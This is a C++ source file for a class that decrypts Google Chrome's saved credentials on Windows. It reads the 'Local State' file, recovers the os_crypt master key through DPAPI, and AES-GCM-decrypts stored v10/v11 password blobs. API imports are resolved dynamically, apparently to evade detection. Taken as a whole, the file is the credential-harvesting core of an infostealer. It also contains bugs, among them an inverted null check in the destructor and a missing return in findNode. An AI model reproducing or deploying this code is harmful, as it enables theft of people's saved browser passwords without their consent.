#include "../includes/ChromeDecrypt.h"
#include "../includes/Base64.h"

ChromeDecrypt::ChromeDecrypt() 
{

	m_tempSaver = new char[MAX_SIZE];
	//get functions
	m_BCryptDecrypt = WinApiImport<f_BCryptDecrypt>::get("BCryptDecrypt", "bcrypt.dll");
	m_CryptUnprotectData = WinApiImport<f_CryptUnprotectData>::get("CryptUnprotectData", "crypt32.dll");
	m_BCryptOpenAlgorithmProvider = WinApiImport<f_BCryptOpenAlgorithmProvider>::get("BCryptOpenAlgorithmProvider", "bcrypt.dll");
	m_BCryptSetProperty = WinApiImport<f_BCryptSetProperty>::get("BCryptSetProperty", "bcrypt.dll");
	m_BCryptGenerateSymmetricKey = WinApiImport<f_BCryptGenerateSymmetricKey>::get("BCryptGenerateSymmetricKey", "bcrypt.dll");
}

ChromeDecrypt::~ChromeDecrypt()
{
	if (!m_tempSaver)
		delete m_tempSaver;
}

bool ChromeDecrypt::initDecryptor(const std::string& path)
{
	std::string keyBase64;
	char key[8192];
	DWORD size = 0;
	//get the key and decrypt it
	if (!getChromeKey(keyBase64, size, path) || !decryptKey(keyBase64, size, key))
	{
		return false;
	}
	//init the alg and key handlers
	initHandlers((PBYTE)key, strlen(key));
	return true;
}

bool ChromeDecrypt::decrypt(const std::string& encrypted, std::string& decrypted, int size)
{
	auto password = const_cast<char*>(encrypted.c_str());
	  
	//check the version -ASE GCM decryption for chrome 80 + 
	if ((encrypted[0] == 'v' &&encrypted[1] == '1' && encrypted[2] == '0') ||
		(encrypted[0] == 'v' && encrypted[1] == '1' && encrypted[2] == '1'))
	{
		//The encrypted data in this case start with the ASCII encoding of v10/v11 
		//followed by the 12 bytes nonce, the actual ciphertext and finally the 16 bytes authentication tag.

		ULONG cbOutput = MAX_SIZE;
		ULONG cbCiphertext = 0;


		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
		BCRYPT_INIT_AUTH_MODE_INFO(BACMI);

		BACMI.pbNonce = (PUCHAR)(password + 3); //pointer to nonce
		BACMI.cbNonce = 12; //size to nonce

		BACMI.pbTag = (PUCHAR)(password + size - 16);//pointer to tag
		BACMI.cbTag = 16; //size of tag 


		if (!BCRYPT_SUCCESS(m_BCryptDecrypt(m_keyHandler, (BYTE*)(password + 15), size - 31, &BACMI, NULL, 0, (PUCHAR)m_tempSaver, cbOutput, &cbCiphertext, 0)))
		{
			return false;
		}

		m_tempSaver[cbCiphertext] = '\0'; //add null terminator
		decrypted = m_tempSaver;

		return true;
	}
	
	//for chrome version lower then 80
	char decryptedPass[1024];

	if (!decryptDPAPI(reinterpret_cast<BYTE*>(password), size, decryptedPass))
	{
		return false;
	}

	decrypted = decryptedPass;
	return true;
}

inline bool ChromeDecrypt::getChromeKey(std::string& key, unsigned long& size, const std::string& path)
{
	int localData = 0x001c;
	std::string keyPath = getAppFolder(localData);
	if (keyPath.empty())
		return false;

	keyPath += path + R"(\User Data\Local State)";
	std::string jsonStr;

	if (!isFileExists(keyPath) || !readFile(keyPath, jsonStr))
		return false;


	const auto jsonObj = cJSON_Parse(jsonStr.c_str());
	if (!jsonObj)
		return false;

	if (const auto node = findNode(jsonObj->child, "os_crypt"))
	{
		key = cJSON_GetStringValue(node->child);
		size = key.length();
	}

	return true;
}

bool ChromeDecrypt::decryptKey(std::string key, DWORD size, char* decKey)
{
	char* keyEncDPAPI = new char[size];
	DWORD keyEncDPAPISize = 0;
	BYTE* keyEnc = NULL;
	DWORD keyEncSize = 0;
	//the key is in base 64 so we need to decode it 
	auto keyDec = base64_decryptor::base64_decode(key);

	keyEncDPAPISize = keyDec.length();

	keyEncDPAPI = (char*)keyDec.c_str();

	//remove 5 bytes
	keyEnc = new BYTE[keyEncDPAPISize - DPAPI_PREFIX_LEN];

	//copy all starting from byte 5 
	int counter = 0;
	for (int i = DPAPI_PREFIX_LEN; i < keyEncDPAPISize; i++)
	{
		keyEnc[counter++] = keyEncDPAPI[i];
	}
	//decrypt the key
	if (decryptDPAPI(keyEnc, (keyEncDPAPISize - DPAPI_PREFIX_LEN), decKey))
	{
		delete[] keyEnc;
		return true;
	}

	return false;
}

bool ChromeDecrypt::decryptDPAPI(unsigned char* encData, unsigned long size, char* decData)
{
	DATA_BLOB enc;
	DATA_BLOB dec;

	enc.cbData = size;
	enc.pbData = encData;

	if (m_CryptUnprotectData(&enc, NULL, NULL, NULL, NULL, 0, &dec))
	{
		for (int i = 0; i < dec.cbData; i++)
			decData[i] = dec.pbData[i];
		decData[dec.cbData] = '\0'; //add null terminator

		return true;
	}

	return false;
}

bool ChromeDecrypt::initHandlers(PBYTE key, ULONG size)
{ 
	//init alg handler
	if (m_BCryptOpenAlgorithmProvider(&m_algHandler, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
	{
		return false;
	}


	if (m_BCryptSetProperty(m_algHandler, BCRYPT_CHAINING_MODE, 
		(PUCHAR)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0) != 0)
	{
		return false;
	}
	//init key handler 
	if (m_BCryptGenerateSymmetricKey(m_algHandler, &m_keyHandler, NULL, 0, key, size, 0) != 0)
	{
		return false;
	}
	return true;
	
}

cJSON* ChromeDecrypt::findNode(cJSON* node, const char* key)
{
	if (!node) 
		return nullptr;

	if (strcmp(node->string, key) == 0)
	{
		return node;
	}

	findNode(node->next, key);
}

std::string ChromeDecrypt::getAppFolder(int CSIDL_FLAG)
{
	const auto userPath = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");

	if (!userPath)
		return {};
	char path[MAX_PATH];

	if (userPath(NULL, CSIDL_FLAG, NULL, 0, path) != S_OK)
		return "";

	return path;
}



bool ChromeDecrypt::isFileExists(const std::string& file)
{
	const auto func_FindFirstFile = WinApiImport<f_FindFirstFile>::get("FindFirstFile", "kernel32.dll");
	const auto func_FindClose = WinApiImport<f_FindClose>::get("FindClose", "kernel32.dll");

	WIN32_FIND_DATA FindFileData;
	HANDLE handle = func_FindFirstFile(file.c_str(), &FindFileData);
	int found = handle != INVALID_HANDLE_VALUE;
	if (found)
	{
		func_FindClose(handle);
	}
	return found;
}


 bool ChromeDecrypt::readFile(const std::string& file, std::string& data)
{
	if (!isFileExists(file))
		return false;

	const auto func_GetFileSize = WinApiImport<f_GetFileSize>::get("GetFileSize", "kernel32.dll");
	const auto func_CreateFileA = WinApiImport<f_CreateFileA>::get("CreateFileA", "kernel32.dll");
	const auto func_CloseHandle = WinApiImport<f_CloseHandle>::get("CloseHandle", "kernel32.dll");
	const auto func_ReadFile = WinApiImport<f_ReadFile>::get("ReadFile", "kernel32.dll");

	auto hFile = func_CreateFileA(file.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);

	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	const auto fileSize = func_GetFileSize(hFile, NULL);

	if (fileSize == 0)
		return false;

	char* tempBuff = new char[fileSize];

	DWORD numToRead;
	if (!func_ReadFile(hFile, tempBuff, fileSize, &numToRead, NULL))
		return false;

	data = tempBuff;
	data.resize(numToRead);
	delete[] tempBuff;

	if (!func_CloseHandle(hFile))
		return false;

	return true;
}



